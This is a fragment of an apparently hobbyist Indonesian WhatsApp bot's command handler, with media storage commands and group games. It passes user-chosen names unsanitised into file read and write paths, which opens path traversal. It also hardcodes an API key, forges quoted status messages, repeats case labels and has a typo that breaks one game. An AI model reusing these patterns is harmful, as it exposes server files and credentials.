						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Time* : ${i.time}\n*Content* : ${i.content}\n\n𝗙𝗼𝘅 𝗻??𝘄??\n`

					}

					sendButMessage(from, teks, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
					break
 ////SPORTAGE MENU

 case 'slow':
 encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
  hah = fs.readFileSync(ran)
kahfzz.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: freply})
fs.unlinkSync(ran)
 })
 break
 case 'stickerlist':
 case 'liststicker':
 teks = '*Sticker List :*\n\n'
 for (let awokwkwk of setiker) {
  teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
kahfzz.sendMessage(from, teks.trim(), extendedText, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} } }, contextInfo: { "mentionedJid": setiker } })
kahfzz.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')}}}})

break
case 'addsticker':

svst = body.slice(12)
if (!svst) return reply('Nama sticker nya apa?')
 boij = JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
  delb = await kahfzz.downloadMediaMessage(boij)
  setiker.push(`${svst}`)
  fs.writeFileSync(`./media/sticker/${svst}.webp`, delb)
  fs.writeFileSync('./media/stick.json', JSON.stringify(setiker))
  kahfzz.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} } } })
  kahfzz.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')}}}})

  break


  case 'stickerlist':
  case 'liststicker':
  teks = '*Sticker List :*\n\n'
  for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
 }
 teks += `\n*Total : ${setiker.length}*`
 kahfzz.sendMessage(from, teks.trim(), extendedText, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } }, contextInfo: { "mentionedJid": setiker } })
 kahfzz.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')}}}})

 break
 case 'addsticker':

 svst = body.slice(12)
 if (!svst) return reply('Nama sticker nya apa?')
  boij = JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await kahfzz.downloadMediaMessage(boij)
setiker.push(`${svst}`)
fs.writeFileSync(`./media/sticker/${svst}.webp`, delb)
fs.writeFileSync('./media/stick.json', JSON.stringify(setiker))
kahfzz.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } } })
kahfzz.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')}}}})

break


case 'addvn':

svst = body.slice(7)
if (!svst) return reply('Nama audionya apa su?')
  boij = JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await kahfzz.downloadMediaMessage(boij)
audionye.push(`${svst}`)
fs.writeFileSync(`./src/audio/${svst}.mp3`, delb)
fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))
kahfzz.sendMessage(from, `Sukses Menambahkan Vn ke dalam database\nSilahkann Cek dengan cara ${prefix}listvn`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
break
case 'getvn':
if (args.length < 1) return reply('Masukan nama yang terdaftar di list vn')
  namastc = body.slice(7)
buffer = fs.readFileSync(`./src/audio/${namastc}.mp3`)
kahfzz.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4',  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, ptt: true })
break
case 'getsticker':
case 'gets':
if (args.length < 1) return reply('Masukan nama yang terdaftar di list sticker')
  namastc = body.slice(12)
result = fs.readFileSync(`./src/sticker/${namastc}.webp`)
kahfzz.sendMessage(from, result, sticker)
break
case 'liststicker':
teks = '*Sticker List :*\n\n'
for (let awokwkwk of setiker) {
 teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
kahfzz.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": setiker } })
break
case 'listvn':
case 'vnlist':
teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
 teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*`
kahfzz.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": audionye } })
break
case 'addimage':
if (!isQuotedImage) return reply('Reply imagenya blokk!')
  svst = body.slice(10)
if (!svst) return reply('Nama imagenya apa su?')
  boij = JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await kahfzz.downloadMediaMessage(boij)
imagenye.push(`${svst}`)
fs.writeFileSync(`./src/image/${svst}.jpeg`, delb)
fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))
kahfzz.sendMessage(from, `Sukses Menambahkan image ke dalam database\nSilahkan cek dengan cara ${prefix}listimage`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 

break
case 'getimage':
case 'getimg':
if (args.length < 1) return reply('Masukan nama yang terdaftar di list image')
  namastc = body.slice(10)
buffer = fs.readFileSync(`./src/image/${namastc}.jpeg`)
kahfzz.sendMessage(from, buffer, image, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, caption: `Result From Database : ${namastc}.jpeg` })
break
case 'imagelist':
case 'listimage':
teks = '*List Image :*\n\n'
for (let awokwkwk of imagenye) {
 teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagenye.length}*`
kahfzz.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": imagenye } })
break

case 'addvideo':
if (!isQuotedVideo) return reply('Reply videonya blokk!')
  svst = body.slice(10)
if (!svst) return reply('Nama videonya apa su?')
  boij = JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await kahfzz.downloadMediaMessage(boij)
videonye.push(`${svst}`)
fs.writeFileSync(`./src/video/${svst}.mp4`, delb)
fs.writeFileSync('./src/video.json', JSON.stringify(videonye))
kahfzz.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
break
case 'getvideo':
if (args.length < 1) return reply('Masukan nama yang terdaftar di list video')
  namastc = body.slice(10)
buffer = fs.readFileSync(`./src/video/${namastc}.mp4`)
kahfzz.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
break
case 'listvideo':
case 'videolist':
teks = '*List Video :*\n\n'
for (let awokwkwk of videonye) {
 teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonye.length}*`
kahfzz.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": videonye } })
break

//------------------< Game >------------------
case 'limitgame': 
case 'balance': 
const balance = atm.checkATMuser(sender, _uang)
if (isPremium) return reply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)
 textImg(`Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.${balance}`)
break
case 'gelud':
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
 if (!isGroup) return reply(mess.only.group)
if (kahfz.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
  if (!kahfz.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
 if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)

  gelutSkuy = setGelud(`${from}`)
gelutSkuy.status = false
gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
gelutSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
starGame = `👑 Memulai Game Baku Hantam ????

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

kahfzz.sendMessage(from, starGame, text, {quoted: freply, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
gameAdd(sender, glimit)
break
case 'delsesigelud':
if (!isGroup) return reply(mess.only.group)
  if (fs.existsSync('./media/' + from + '.json')) {
 fs.unlinkSync('./media/' + from + '.json')
 reply('Berhasil Menghapus Sesi Gelud')
  } else {
 reply('Tidak ada sesi yang berlangsung')
  }
  break
  case 'delsesittt':
  case 'resetgame':
  if (!isGroup) return reply(mess.only.group)
 if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
 ky_ttt = naa 
 reply('Sukses Mereset Game')
 break
 case 'tictactoe':
 case 'ttt':
 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
  if (!isGroup) return reply(mess.only.group)
 if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
  if (kahfz.message.extendedTextMessage === undefined || kahfz.message.extendedTextMessage === null) return reply('Tag target Lawan!')
 ment = kahfz.message.extendedTextMessage.contextInfo.mentionedJid
  player1 = sender
  player2 = ment[0]
  angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
  id = from
  gilir = player2
  ky_ttt.push({player1,player2,id,angka,gilir})
  kahfzz.sendMessage(from, 
 `*🎳 Memulai Game Tictactoe 🎲*

 [@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
 Ketik Y/N untuk menerima atau menolak permainan

 Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})

  gameAdd(sender, glimit)
  break
  case 't':
  titid =  `SILAHKAN PILIH DI BAWAH UNTUK MELANJUTKAN`

  sendButMessage(from, titid, `crated Kahfz Bot`, [
  {
 buttonId: `Y`,
 buttonText: {
displayText: `Y`,
 },
 type: 1,


  },
  {
 buttonId: `N`,
 buttonText: {
displayText: `N`,
 },
 type: 1,
  },
  ]);


  break
case 'gabut2':
txtt =`Hai Kak ${pushname}\nPencet Aja Anjing`

 buttons = [{buttonId: noprefix ? "todd2" : "!"+"todd2",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
case 'todd2':
txtt =`Hai Kak ${pushname}\nPencet Aja Anjing`

 buttons = [{buttonId: noprefix ? "todd3" : "!"+"todd3",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
case 'todd3':
txtt =`Hai Kak ${pushname}\nPencet Aja Anjing`

 buttons = [{buttonId: noprefix ? "mining" : "!"+"mining",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
  case 'family100':
  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
 if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=IkyChan`)
 titid =  `*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\nTotal Jawaban :* ${anu.data.result.answer.length}\n\nWaktu : ${gamewaktu}s `

 sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
 {
buttonId: `${prefix}family100`,
buttonText: {
  displayText: `⬡ NEXT `,
},
type: 1,
 },]);


 let anoh = anu.data.result.aswer
 let rgfds = []
 for (let i of anoh){
let fefs = i.split('/') ? i.split('/')[0] : i
let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
rgfds.push(axsf.toLowerCase())
 }
 game.addfam(from, rgfds, gamewaktu, family100)
 gameAdd(sender, glimit)
 break
 case 'tebakanime':
 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
